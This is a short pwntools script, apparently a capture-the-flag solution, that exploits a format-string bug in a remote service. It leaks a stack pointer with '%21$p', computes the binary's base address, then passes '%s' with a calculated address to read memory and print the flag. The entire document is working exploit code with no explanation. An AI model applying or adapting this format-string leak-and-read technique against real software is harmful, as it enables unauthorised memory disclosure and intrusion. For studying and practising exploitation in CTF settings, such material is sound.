from pwn import *

#p = process("./main")
p = remote(ADDRESS, PORT)
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b" : ", b"%21$p")
p.sendlineafter(b" : ", b"0")
base = int(p.recvline()[:-1], 16)
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b" : ", b"%s")
payload = str(base - 0x1249 + 0x4060).encode()
p.sendlineafter(b" : ", payload)
flag = p.recvline()
print("Flag : ", flag.decode().strip())